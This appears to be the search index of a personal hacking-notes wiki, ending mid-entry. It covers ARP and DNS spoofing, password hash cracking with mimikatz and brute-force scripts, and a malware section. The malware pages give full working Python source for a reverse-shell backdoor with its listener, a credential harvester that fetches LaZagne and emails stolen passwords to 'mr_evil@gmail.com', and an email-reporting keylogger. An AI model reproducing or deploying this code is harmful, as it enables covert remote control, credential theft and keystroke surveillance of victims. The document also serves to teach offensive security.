[{"id":0,"href":"/arp/","title":"arp","parent":"Home","content":" Arp cache poisoning ARP spoof detection Network scanning using arp ","description":" Arp cache poisoning ARP spoof detection Network scanning using arp "},{"id":1,"href":"/cmp-t-pentest+/","title":"comp.t.sec+","parent":"Home","content":" Planning an Engagement Risk ","description":" Planning an Engagement Risk "},{"id":2,"href":"/cryptography/","title":"cryptography","parent":"Home","content":" Ciphers Caesar Cipher \u0026amp; ROT13 One Time Pad XOR Cipher Hashing Linux Password Hash Cracking MD5 \u0026amp; SHA Hashes Windows Password Hash Cracking Strong Encryption AES \u0026amp; Padding Oracle Attack ","description":" Ciphers Caesar Cipher \u0026amp; ROT13 One Time Pad XOR Cipher Hashing Linux Password Hash Cracking MD5 \u0026amp; SHA Hashes Windows Password Hash Cracking Strong Encryption AES \u0026amp; Padding Oracle Attack "},{"id":3,"href":"/data/","title":"data","parent":"Home","content":" ASCII Base64 Binary Hex ","description":" ASCII Base64 Binary Hex "},{"id":4,"href":"/dns/","title":"dns","parent":"Home","content":" DNS request sniffing DNS spoofing ","description":" DNS request sniffing DNS spoofing "},{"id":5,"href":"/malware/","title":"malware","parent":"Home","content":" Malware example: backdoor Malware example: credential harvesting Malware example: keylogger ","description":" Malware example: backdoor Malware example: credential harvesting Malware example: keylogger "},{"id":6,"href":"/networking/","title":"networking","parent":"Home","content":" L2 vs L3 switch ","description":" L2 vs L3 switch "},{"id":7,"href":"/various/","title":"various","parent":"Home","content":" Books ","description":" Books "},{"id":8,"href":"/web/","title":"web","parent":"Home","content":" HTTP HTTP code injection \u0026amp; BeEF HTTP credentials sniffing Modifying HTTP download response SSL stripping Webapps Session Management Intro ","description":" HTTP HTTP code injection \u0026amp; BeEF HTTP credentials sniffing Modifying HTTP download response SSL stripping Webapps Session Management Intro "},{"id":9,"href":"/dns/dns_request_sniffing/","title":"DNS request sniffing","parent":"dns","content":"After we become the mitm we can sniff the DNS Question Record\u0026rsquo;s QNAME field.\nI am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 Full code:\nimport netfilterqueue import scapy.all as scapy def process_packet(packet): if packet.get_payload: try: scapy_packet = scapy.IP(packet.get_payload()) finally: if scapy_packet: if scapy_packet.haslayer(scapy.DNSQR): qname = scapy_packet[scapy.DNSQR].qname print(qname) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can sniff the DNS Question Record\u0026rsquo;s QNAME field.\nI am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:"},{"id":10,"href":"/various/books/","title":"Books","parent":"various","content":" Penetration Testing: A Hands-On Introduction to Hacking The Web Application Hackers Handbook Computer Security: A Hands-on Approach Black Hat Python Buffer Overflow Attacks - Detect Exploit Prevent Cross Site Scripting Attacks Xss Exploits and Defense Cybersecurity - Attack and Defense Strategies Fuzzing Brute Force Vulnerability Discovery Hacking Exposed Linux Hacking The Art of Exploitation Kali Linux an Ethical Hackers Cookbook Mastering Kali Linux for Advanced Penetration Testing Penetration Testing A Hands On Introduction to Hacking Python Penetration Testing Essentials RTFM red team field manual TCP IP Guide Oct 2005 The Basics of Hacking and Penetration Testing The Basics of Web Hacking - Tools and Techniques to Attack the Web Understanding Network Hacks_ Attack and Defense With Python Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers Wireshark for Security Professionals Wireshark - Practical packet analysis to Solve Real World Problems ","description":" Penetration Testing: A Hands-On Introduction to Hacking The Web Application Hackers Handbook Computer Security: A Hands-on Approach Black Hat Python Buffer Overflow Attacks - Detect Exploit Prevent Cross Site Scripting Attacks Xss Exploits and Defense Cybersecurity - Attack and Defense Strategies Fuzzing Brute Force Vulnerability Discovery Hacking Exposed Linux Hacking The Art of Exploitation Kali Linux an Ethical Hackers Cookbook Mastering Kali Linux for Advanced Penetration Testing Penetration Testing A Hands On Introduction to Hacking Python Penetration Testing Essentials RTFM red team field manual TCP IP Guide Oct 2005 The Basics of Hacking and Penetration Testing The Basics of Web Hacking - Tools and Techniques to Attack the Web Understanding Network Hacks_ Attack and Defense With Python Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers Wireshark for Security Professionals Wireshark - Practical packet analysis to Solve Real World Problems "},{"id":11,"href":"/malware/backdoor/","title":"Malware example: backdoor","parent":"malware","content":"In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server. This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.\nWhen the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall. We will use sockets and send the data over a TCP stream.\nMessage Oriented protocols send data in distinct chunks or groups. The receiver of data can determine where one message ends and another begins. Stream protocols send a continuous flow of data.\nHere is an example with mobile phones. Text messages would be a message oriented protocol as each text message is distinct from the other messages. A phone call is stream oriented as there is a continuous flow of audio throughout the call.\nUDP is message oriented and TCP is stream oriented.\nIn this example we will use serialization which has these benefits:\nthe message is well defined, the receiver knows if message is incomplete it can be used to transfer objects (lists, dicts, etc) At the client we will convert our object to a stream of well defined bytes, on the server we will convert the well-defined stream of bytes back into an object.\nWe will use JSON to implement this. This way we can convert data structures (such as objects, dictionaries, lists etc) into text (json.dumps(data))\nThe text will then be send over the TCP stream and the receiver will use JSON again to convert it back into its original data structure (json.loads(data))\n#!/usr/bin/env python import socket import json import base64 import sys class Listener: def __init__(self, ip, port): listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) listener.bind((ip, port)) listener.listen(0) print(\u0026#34;\\n [+] Waiting for connection \\n\u0026#34;) self.connection, address = listener.accept() print(\u0026#34;[+] Got a connection from \u0026#34; + str(address)) def reliable_send(self, data): json_data = json.dumps(data) self.connection.send(json_data) def reliable_receive(self): json_data = \u0026#34;\u0026#34; while True: try: json_data = json_data + self.connection.recv(1024) return json.loads(json_data) except ValueError: continue def execute_remotely(self, command): self.reliable_send(command) if command[0] == \u0026#34;exit\u0026#34;: self.connection.close() exit() # get the received data from our backdoor command return self.reliable_receive() def write_file(self, path, content): with open(path, \u0026#34;wb\u0026#34;) as file: file.write(base64.b64decode(content)) return \u0026#34;[+] Download successful.\u0026#34; def read_file(self, path): with open(path, \u0026#34;rb\u0026#34;) as file: return base64.b64encode(file.read()) def run(self): while True: command = raw_input(\u0026#34;\u0026gt;\u0026gt; \u0026#34;) command = command.split(\u0026#34; \u0026#34;) try: if command[0] == \u0026#34;upload\u0026#34;: file_content = self.read_file(command[1]) command.append(file_content) result = self.execute_remotely(command) if command[0] == \u0026#34;download\u0026#34; and \u0026#34;[-] Error \u0026#34; not in result: result = self.write_file(command[1], result) result = self.execute_remotely(command) except Exception: result = \u0026#34;[-] Error during command execution.\u0026#34; print(result) my_listener = Listener(\u0026#34;192.168.0.10\u0026#34;, 4444) my_listener.run() #!/usr/bin/env python import socket import subprocess import json import os import base64 import sys class Backdoor: def __init__(self, ip, port): self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.connection.connect((ip, port)) def reliable_send(self, data): json_data = json.dumps(data) self.connection.send(json_data) def reliable_receive(self): json_data = \u0026#34;\u0026#34; while True: try: json_data = json_data + self.connection.recv(1024) return json.loads(json_data) except ValueError: continue def execute_system_command(self, command): return subprocess.check_output(command, shell=True) def change_working_directory_to(self, path): os.chdir(path) return \u0026#34;[+] Changing directory to \u0026#34; + path def read_file(self, path): with open(path, \u0026#34;rb\u0026#34;) as file: return base64.b64encode(file.read()) def write_file(self, path, content): with open(path, \u0026#34;wb\u0026#34;) as file: file.write(base64.b64decode(content)) return \u0026#34;[+] Upload successful.\u0026#34; def run(self): while True: command = self.reliable_receive() try: if command[0] == \u0026#34;exit\u0026#34;: self.connection.close() sys.exit() elif command[0] == \u0026#34;cd\u0026#34; and len(command) \u0026gt; 1: command_result = self.change_working_directory_to(command[1]) elif command[0] == \u0026#34;download\u0026#34;: command_result = self.read_file(command[1]) elif command[0] == \u0026#34;upload\u0026#34;: command_result = self.write_file(command[1], command[2]) else: command_result = self.execute_system_command(command) except Exception: command_result = \u0026#34;[-] Error during command execution.\u0026#34; self.reliable_send(command_result) my_door = Backdoor(\u0026#34;192.168.0.10\u0026#34;, 4444) my_door.run() ","description":"In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server. This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.\nWhen the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall."},{"id":12,"href":"/malware/cross_platform_malware_example/","title":"Malware example: credential harvesting","parent":"malware","content":"Simple example of a cross platform malware program.\nIt downloads the LaZagne credentials harvester (https://github.com/AlessandroZ/LaZagne) to the os specific temp directory, runs it using the \u0026lsquo;all\u0026rsquo; option and send the result via email.\n#!/usr/bin/env python import requests, subprocess, smtplib, os, tempfile def download(url): get_response = requests.get(url) file_name = url.split(\u0026#34;/\u0026#34;)[-1] with open(file_name, \u0026#34;wb\u0026#34;) as out_file: out_file.write(get_response.content) def send_mail(email, password, message): server = smtplib.SMTP(\u0026#34;smtp.gmail.com\u0026#34;, 587) server.starttls() server.login(email,password) server.sendmail(email, email, message) server.quit() temp_directory = tempfile.gettempdir() os.chdir(temp_directory) download(\u0026#34;https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe\u0026#34;) result = subprocess.check_output(\u0026#34;lazagne.exe all\u0026#34;, shell=True) send_mail(\u0026#34;mr_evil@gmail.com\u0026#34;, \u0026#34;password\u0026#34;, result) os.remove(\u0026#34;lazagne.exe\u0026#34;) ","description":"Simple example of a cross platform malware program.\nIt downloads the LaZagne credentials harvester (https://github.com/AlessandroZ/LaZagne) to the os specific temp directory, runs it using the \u0026lsquo;all\u0026rsquo; option and send the result via email.\n#!/usr/bin/env python import requests, subprocess, smtplib, os, tempfile def download(url): get_response = requests.get(url) file_name = url.split(\u0026#34;/\u0026#34;)[-1] with open(file_name, \u0026#34;wb\u0026#34;) as out_file: out_file.write(get_response.content) def send_mail(email, password, message): server = smtplib.SMTP(\u0026#34;smtp.gmail.com\u0026#34;, 587) server.starttls() server.login(email,password) server.sendmail(email, email, message) server.quit() temp_directory = tempfile."},{"id":13,"href":"/malware/keylogger/","title":"Malware example: keylogger","parent":"malware","content":"Example of a cross platform keylogger class using Threading.\n#!/usr/bin/env python import pynput.keyboard import threading import smtplib class Keylogger: def __init__(self, time_interval, email, password): self.log = \u0026#34;Keylogger started\u0026#34; self.interval = time_interval self.email = email self.password = password def append_to_log(self, string): self.log = self.log + string def process_key_press(self, key): try: current_key = str(key.char) except AttributeError: if key == key.space: current_key = \u0026#34; \u0026#34; else: current_key = \u0026#34; \u0026#34; + str(key) + \u0026#34; \u0026#34; self.append_to_log(current_key) def report(self): self.send_mail(self.email, self.password, \u0026#34;\\n\\n\u0026#34; + self.log) self.log = \u0026#34;\u0026#34; timer = threading.Timer(self.interval, self.report) timer.start() def send_mail(self, email, password, message): server = smtplib.SMTP(\u0026#34;smtp.gmail.com\u0026#34;, 587) server.starttls() server.login(email, password) server.sendmail(email, email, message) server.quit() def start(self): # every time a key is pressed call the function process_key_press keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) # starting the listener with keyboard_listener: self.report() keyboard_listener.join() my_keylogger = keylogger.Keylogger(120, \u0026#34;mr_evil@gmail.com\u0026#34;, \u0026#34;password\u0026#34;) my_keylogger.start() ","description":"Example of a cross platform keylogger class using Threading.\n#!/usr/bin/env python import pynput.keyboard import threading import smtplib class Keylogger: def __init__(self, time_interval, email, password): self.log = \u0026#34;Keylogger started\u0026#34; self.interval = time_interval self.email = email self.password = password def append_to_log(self, string): self.log = self.log + string def process_key_press(self, key): try: current_key = str(key.char) except AttributeError: if key == key.space: current_key = \u0026#34; \u0026#34; else: current_key = \u0026#34; \u0026#34; + str(key) + \u0026#34; \u0026#34; self."},{"id":14,"href":"/cryptography/ciphers/otp/","title":"One Time Pad","parent":"Ciphers","content":"One-time pad (OTP), also called Vernam-cipher or the perfect cipher, is a crypto algorithm where plaintext is combined with a random key.\nIt is the only existing mathematically unbreakable encryption.\nUsed by Special Operations teams and resistance groups during WW2, popular with intelligence agencies and their spies during the Cold War and beyond, protecting diplomatic and military message traffic around the world for many decades, the one-time pad gained a reputation as a simple yet solid encryption system with an absolute security which is unmatched by today\u0026rsquo;s modern crypto algorithms.\nWhatever technological progress may come in the future, one-time pad encryption is, and will remain, the only truly unbreakable system that provides real long-term message secrecy.\nWe can only talk about one-time pad if some important rules are followed. If these rules are applied correctly, the one-time pad can be proven unbreakable. Even infinite computational power and infinite time cannot break one-time pad encryption, simply because it is mathematically impossible. However, if only one of these rules is disregarded, the cipher is no longer unbreakable.\nThe key is at least as long as the message or data that must be encrypted. The key is truly random (not generated by a simple computer function or such) -\u0026gt; https://www.random.org/ Key and plaintext are calculated modulo 10 (digits), modulo 26 (letters) or modulo 2 (binary) Each key is used only once, and both sender and receiver must destroy their key after use. There should only be two copies of the key: one for the sender and one for the receiver (some exceptions exist for multiple receivers) Important note: one-time pads or one-time encryption is not to be confused with one-time keys (OTK) or one-time passwords (sometimes also denoted as OTP). Such one-time keys, limited in size, are only valid for a single encryption session by some crypto-algorithm under control of that key. Small one-time keys are by no means unbreakable, because the security of the encryption depends on the crypto algorithm they are used for.\n","description":"One-time pad (OTP), also called Vernam-cipher or the perfect cipher, is a crypto algorithm where plaintext is combined with a random key.\nIt is the only existing mathematically unbreakable encryption.\nUsed by Special Operations teams and resistance groups during WW2, popular with intelligence agencies and their spies during the Cold War and beyond, protecting diplomatic and military message traffic around the world for many decades, the one-time pad gained a reputation as a simple yet solid encryption system with an absolute security which is unmatched by today\u0026rsquo;s modern crypto algorithms."},{"id":15,"href":"/cryptography/strong_encryption/aes/","title":"AES \u0026 Padding Oracle Attack","parent":"Strong Encryption","content":"Under construction\u0026hellip;\nhttps://crypto.stackexchange.com/questions/3714/how-does-a-padding-oracle-attack-work https://resources.infosecinstitute.com/padding-oracle-attack-2/#gref https://tlseminar.github.io/padding-oracle/\nhttps://thebestvpn.com/advanced-encryption-standard-aes/\nhttps://www.youtube.com/watch?v=1sdOaXTUGa4 https://robertheaton.com/2013/07/29/padding-oracle-attack/ https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth https://erlend.oftedal.no/blog/poet/\nx=1 ^ y=1 = 0 x=1 ^ y=0 = 1 x=0 ^ y=0 = 0 x=0 ^ y=1 = 1\nAn intuitive way of understanding why XOR is associative is as follows:\nFirst recognize that XOR is commutative, that is, a⊕b=b⊕a. This can be done using a truth table.\nThen, think of the XOR operator as a \u0026lsquo;conditional flip\u0026rsquo; operator, that is think of a⊕b as saying if a is 1, take flipped b as the output, while if a is 0, take b as the output. Because of the commutative property, a⊕b is completely equivalent to b⊕a which says that b conditionally flips a.\nNow consider a⊕(b⊕c). This is saying that b conditionally flips c, the result of which is itself conditionally flipped by a. Because of the nature of the flipping operation, ultimately c is conditionally flipped by both b and a, and it doesn\u0026rsquo;t matter in which order these two flip operations are performed. Because of this, it is seen that a⊕(b⊕c) is equivalent to b⊕(a⊕c).\nFinally, by using commutativity, one can write a⊕(b⊕c)=(b⊕c)⊕a, which was just showed to be equivalent to b⊕(a⊕c), itself equivalent to b⊕(c⊕a) by commutativity.\nTherefore, (b⊕c)⊕a=b⊕(c⊕a) which proves associativity.\n","description":"Under construction\u0026hellip;\nhttps://crypto.stackexchange.com/questions/3714/how-does-a-padding-oracle-attack-work https://resources.infosecinstitute.com/padding-oracle-attack-2/#gref https://tlseminar.github.io/padding-oracle/\nhttps://thebestvpn.com/advanced-encryption-standard-aes/\nhttps://www.youtube.com/watch?v=1sdOaXTUGa4 https://robertheaton.com/2013/07/29/padding-oracle-attack/ https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth https://erlend.oftedal.no/blog/poet/\nx=1 ^ y=1 = 0 x=1 ^ y=0 = 1 x=0 ^ y=0 = 0 x=0 ^ y=1 = 1\nAn intuitive way of understanding why XOR is associative is as follows:\nFirst recognize that XOR is commutative, that is, a⊕b=b⊕a. This can be done using a truth table.\nThen, think of the XOR operator as a \u0026lsquo;conditional flip\u0026rsquo; operator, that is think of a⊕b as saying if a is 1, take flipped b as the output, while if a is 0, take b as the output."},{"id":16,"href":"/cryptography/hashing/linux_password_hashes/","title":"Linux Password Hash Cracking","parent":"Hashing","content":"Create 3 users in Linux and set their passwords:\nsudo useradd -r -s /bin/false john sudo useradd -r -s /bin/false mary sudo useradd -r -s /bin/false dennis sudo passwd john (using P@ssw0rd as password) sudo passwd mary (using P@ssw0rd as password) sudo passwd dennis (using P@ssw0rd999 as password) The /etc/shadow contents:\nsudo cat /etc/shadow | grep -E \u0026#39;john|mary|dennis\u0026#39; john:$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.:17927:::::: mary:$6$pwiGPdMP$CvjOQZPsnAaWVRwWcOjimPWdNzucgCIh6DAVWF5io0zn0hzjWJPkVDpUX6OryYaOahRu4t5TxMXgXEqPkIfRK1:17927:::::: dennis:$6$nJO6qY4r$YfG8AWh22sncAusvM..92uzphXtnbEej1rpyP0yrYSQlI7XATA9PEknEb52PVHxXH5C/Oxo46ssMEwZG6PGJp1:17927:::::: After each username comes $6 which indicates this is a password type 6, meaning its hashed using SHA-512, which is the most modern and secure form of password hashing. SHA-256 password hashes should begin with $5. After the $6 we get another $ sign indicating what comes next is the SALT. Then comes another $ sign followed by the actual password hash.\nFor user john that would be:\nSALT: WvpWG7ls HASH: IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb. Some things to observe:\nthe password hash is much longer then a windows password hash and more complicated even though john and mary have the same password they have completely different hashes because a random SALT is added to each one before hashing in order to obscure the fact that those password are the same. Salting makes the password much stronger. linux password hashes use both Salting (add random characters before hashing) \u0026amp; Stretching (hash multiple times). instead of simply using one round of md4 it uses 5000 rounds of SHA-512. this means it takes much more CPU time to calculate the hash in order to slow down attackers. the Salt and the hash are Base64-encoded. The details of this hashing algorithm can be found in the /etc/login.defs file.\nTo use in python:\npip install passlib To recreate john\u0026rsquo;s hash:\nsha512_crypt.using(salt=\u0026#34;WvpWG7ls\u0026#34;, rounds=5000).hash(\u0026#34;P@ssw0rd\u0026#34;) \u0026#39;$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.\u0026#39; So to attack this we can use a bruteforce dictionary guessing attack, eventually finding the matching hash.\nsha512_crypt.using(salt=\u0026#34;WvpWG7ls\u0026#34;, rounds=5000).hash(\u0026#34;P@ssw0ra\u0026#34;) \u0026#39;$6$WvpWG7ls$fC.NzVa0wZwWAcMdNKFi0iJhif9xhgcyiSMUfrBcera7x9UlSR.N33.A5d1wunLJuuJ74d65qHJD7SnC162tQ/\u0026#39; sha512_crypt.using(salt=\u0026#34;WvpWG7ls\u0026#34;, rounds=5000).hash(\u0026#34;P@ssw0rb\u0026#34;) \u0026#39;$6$WvpWG7ls$2tXaVYseB.oYkxLKDg5zz0JYpQud0SwIy.a/.3wK350Ebs4dfakhYcnVuSUlOOuIivSEOTCZWgDJq.luxvTKg0\u0026#39; sha512_crypt.using(salt=\u0026#34;WvpWG7ls\u0026#34;, rounds=5000).hash(\u0026#34;P@ssw0rc\u0026#34;) \u0026#39;$6$WvpWG7ls$XaEhKjRj2R1JZWCNxKUjLfHUmNmYPgn54SKcBIvUgZsy/f74J.y.RFkGrN69J6i5Liq82/7dt5Qy.yGEBXnYt1\u0026#39; sha512_crypt.using(salt=\u0026#34;WvpWG7ls\u0026#34;, rounds=5000).hash(\u0026#34;P@ssw0rd\u0026#34;) \u0026#39;$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.\u0026#39; \u0026lt;--- match Suppose we have the following salt / hash:\nSALT: PcSLfisbduUgOzRBUGOyr4OghBm8JRfNTDnbo5sMbrFP/wgT816rNwGRDcZdkQ/CeejGgp9eiHB17v/zZ/HqT/ HASH: penguins And we know the password is 3 digits long, we can now do:\nfrom passlib.hash import sha512_crypt s = \u0026#39;penguins\u0026#39; for ip in range(1000,2000): sp = str(ip) p = sp[1:] h = sha512_crypt.using(salt=s, rounds=5000).hash(p) if h[12:16] == \u0026#34;PcSL\u0026#34;: print \u0026#39;The password for hash \u0026#39; + h[12:] + \u0026#39; with SALT \u0026#39; + s + \u0026#39; is: \u0026#39; + p Output:\nThe password for hash PcSLfisbduUgOzRBUGOyr4OghBm8JRfNTDnbo5sMbrFP/wgT816rNwGRDcZdkQ/CeejGgp9eiHB17v/zZ/HqT/ with SALT penguins is: 826 ","description":"Create 3 users in Linux and set their passwords:\nsudo useradd -r -s /bin/false john sudo useradd -r -s /bin/false mary sudo useradd -r -s /bin/false dennis sudo passwd john (using P@ssw0rd as password) sudo passwd mary (using P@ssw0rd as password) sudo passwd dennis (using P@ssw0rd999 as password) The /etc/shadow contents:\nsudo cat /etc/shadow | grep -E \u0026#39;john|mary|dennis\u0026#39; john:$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.:17927:::::: mary:$6$pwiGPdMP$CvjOQZPsnAaWVRwWcOjimPWdNzucgCIh6DAVWF5io0zn0hzjWJPkVDpUX6OryYaOahRu4t5TxMXgXEqPkIfRK1:17927:::::: dennis:$6$nJO6qY4r$YfG8AWh22sncAusvM..92uzphXtnbEej1rpyP0yrYSQlI7XATA9PEknEb52PVHxXH5C/Oxo46ssMEwZG6PGJp1:17927:::::: After each username comes $6 which indicates this is a password type 6, meaning its hashed using SHA-512, which is the most modern and secure form of password hashing."},{"id":17,"href":"/cryptography/hashing/windows_password_hashes/","title":"Windows Password Hash Cracking","parent":"Hashing","content":"Create 3 users on Windows 2016 Server (i used evaluation version in VirtualBox)\nDisable Realtime Virus Protection:\nCreate directory c:\\mimikatz and open command prompt in this directory, then run this command to export the SAM database into the c:\\mimikatz directory:\nreg save HKLM\\SAM sam.hiv Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases, extract to c:\\mimikatz and run it from a command prompt:\nc:\\mimikatz\u0026gt;mimikatz.exe In the mimikatz prompt run these commands:\nlog privilege::debug token::elevate lsadump::sam sam.hiv Output:\nRID : 000003e8 (1000) User : john Hash NTLM: 4649843ceeac228e43667d160ab1d994 RID : 000003e9 (1001) User : mary Hash NTLM: 4649843ceeac228e43667d160ab1d994 RID : 000003ea (1002) User : dennis Hash NTLM: 0342DB37D0A08A6EA2284584876CCED0 If you now run this command in python we can see the hash is using md4 with utf-16le encoding.\nimport hashlib hashlib.new(\u0026#34;md4\u0026#34;,\u0026#34;P@sw0rd\u0026#34;.encode(\u0026#34;utf-16le\u0026#34;)).hexdigest() \u0026#39;4649843ceeac228e43667d160ab1d994\u0026#39; \u0026lt;---- john and mary\u0026#39;s P@sw0rd hash! NTHash is a very weak and old password system:\nEncode the password in Unicode (Microsoft uses Unicode since it is an international OS, it allows passwords in languages like japanese and chinese that do not encode with 8 bits per character but 16 bits per character) Hash it with MD4 Grumpy cat does not approve:\nHash cracking with Google Since the password hashes have no variation (no salt used!) and any two users with the same password have the same hash you can use Google search engine to search for the hash that someone else might have already cracked:\nFor the password that dennis uses in above example this will not work but we can just use the same bruteforce guessing attack as described in https://jellepelle.github.io/doc_the_hacks/cryptography/hashing/md5/\nExample of cracking a 7 digit password (10^7 = 10000000 passwords):\nimport hashlib # hash: 0342DB37D0A08A6EA2284584876CCED0 for c1 in \u0026#34;0123456789\u0026#34;: for c2 in \u0026#34;0123456789\u0026#34;: for c3 in \u0026#34;0123456789\u0026#34;: for c4 in \u0026#34;0123456789\u0026#34;: for c5 in \u0026#34;0123456789\u0026#34;: for c6 in \u0026#34;0123456789\u0026#34;: for c7 in \u0026#34;0123456789\u0026#34;: p = c1 + c2 + c3 + c4 + c5 + c6 + c7 hash = hashlib.new(\u0026#34;md4\u0026#34;, p.encode(\u0026#34;utf-16le\u0026#34;)).hexdigest() if hash[0:7] == \u0026#34;0342db3\u0026#34;: print p, hash1 Many round hash aka Stretching Below is an example of finding a 3 digit password that uses 100 rounds of hashing (this is also called \u0026ldquo;stretching\u0026rdquo;).\nSo each password combination (000 - 999) is hashed 100 times. We are looking for this hash: c09145ad46b058fba82e4218169c7121\nimport hashlib alg = \u0026#34;md5\u0026#34; nr = 100 for ip in range(1000,2000): sp = str(ip) p = sp[1:] h = p for i in range(nr): h = hashlib.new(alg, h).hexdigest() # if h[0:3] == \u0026#34;c09\u0026#34;: print p, h Sample output:\n373 277c4231b9cdabe7d3c14c9f85332c71 373 9cff18aecbbacba96547c662c8276674 373 f2a20e92aec5ec807c7fa6555c72bb57 373 6e00121a32d172d8a57c2082e12ffe58 373 f6a464a9242bc20f6a2483379ba1250b 373 3b47012a2f58f504923cd0352dd10148 373 327e65ca87b3c319a8a888d489abc206 373 cc1f489c2caa6a6dbcc0be8464c06128 373 6e77734aa2290d56b75de9f4c7a29888 373 978563412234ffa23fa96496e39b58da 373 51be797c06126d1c387816bd6206126c 373 10ca162375a312cf1351f21f521f4d87 373 a8257f887d93c8e590ac54c249169773 373 be485ad4e4fbe90dc002e3fdb0d9056a 373 c09145ad46b058fba82e4218169c7121 \u0026lt;----- found it 374 ad972f10e0800b49d76fed33a21f6698 374 38171c7a8c7826a100e42706cefe33b7 374 58524bcab6a0cc553608d216e2c40955 374 fe0570eb6e84e7a64dd0b8f0bc96da3b 374 3a97ed40dc7ee01c971a2b332cab5a80 374 3f027499467da942192689f23faee3fd 374 1733641dc1e97c9fa7de5ca785a0617c 374 ce31d294fd2b4eb102f377f64f57ccdf 374 3b8e2f121daab6f6032d056b596d6bb2 374 edf8aa4fc9fb4ecda01543ff04e3a100 374 91d503d119e93dbd408a813eba100905 374 38d16e9f20beb0e2496ba60c041b5d8d 374 13cba0c828ef2f9b5daa6ec6b3c2b58b 374 193968835eb538428f3f36f760b8ef36 Another example of a many-round-hash:\npassword is three digits, between 000 and 999 hashed an unknown number of times with SHA-1 (no more then 5000) find the password from this hash: f6dc23c15a1d0c64e8d1c53cd95adc346ceeccbe Solution:\nimport hashlib alg = \u0026#34;sha1\u0026#34; nrmax = 5000 for ip in range(1000,2000): sp = str(ip) p = sp[1:] h = p for i in range(nrmax): h = hashlib.new(alg, h).hexdigest() if h[0:5] == \u0026#34;f6dc2\u0026#34;: print i+1, \u0026#34;rounds: password =\u0026#34;, p, \u0026#34;Hash = \u0026#34;, h ","description":"Create 3 users on Windows 2016 Server (i used evaluation version in VirtualBox)\nDisable Realtime Virus Protection:\nCreate directory c:\\mimikatz and open command prompt in this directory, then run this command to export the SAM database into the c:\\mimikatz directory:\nreg save HKLM\\SAM sam.hiv Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases, extract to c:\\mimikatz and run it from a command prompt:\nc:\\mimikatz\u0026gt;mimikatz.exe In the mimikatz prompt run these commands:\nlog privilege::debug token::elevate lsadump::sam sam."},{"id":18,"href":"/cryptography/hashing/md5/","title":"MD5 \u0026 SHA Hashes","parent":"Hashing","content":" What is a hash? A hash is a way to make a \u0026lsquo;fingerprint\u0026rsquo; of a file You take all the bytes of a file and combine them together using a hashing algorithm This creates a fixed length hash value Changing any part of the file will result in a completely different hash value when recalculating So when you have two files that are supposed to be identical, you can verify this by comparing the hashes. MD5 MD5 is a very commonly used hash, it is 128 bits long which is considered to be short for a hash function It is reliable enough for most purposes, ie: its being used for putting fingerprints on downloads or malware samples It is sometimes used to obscure passwords. It is not a perfectly secure hashing function, collisions are possible, so you cannot be 100% certain two files are identical, but usually they are. Its easy to calculate MD5 in python: import hashlib hashlib.new(\u0026#34;md5\u0026#34;, \u0026#34;sometext\u0026#34;).hexdigest() \u0026#39;a29e90948f4eee52168fab5fa9cfbcf8\u0026#39; The function hexdigest() returns a hexadecimal string representation of the hash.\nSince there are 32 hexadecimal characters in this output string and each character is 4 bits (\u0026lsquo;a nibble\u0026rsquo;) long. 32 * 4 = 128 bits.\nSHA-1, SHA-2, and SHA-3 The Secure Hash Algorithm was designed to be an improvement on MD5. SHA-1 had no collisions untill sometime ago when researchers at Google found out how to make collisions in SHA-1. SHA-2 is considered to be the secure successor. SHA-2 is expected to remain secure for a very long time. There is also SHA-3 but it is not being used much. The most common used lengths are 256 or 512 bits. Below are examples of SHA-1 and SHA-2 (256 \u0026amp; 512) creation. hashlib.new(\u0026#34;sha1\u0026#34;,\u0026#34;sometext\u0026#34;).hexdigest() \u0026#39;d22a158c8ead99dbd7eddb86104496f3ee087049\u0026#39; hashlib.new(\u0026#34;sha256\u0026#34;,\u0026#34;sometext\u0026#34;).hexdigest() \u0026#39;5fb2054478353fd8d514056d1745b3a9eef066deadda4b90967af7ca65ce6505\u0026#39; hashlib.new(\u0026#34;sha512\u0026#34;,\u0026#34;sometext\u0026#34;).hexdigest() 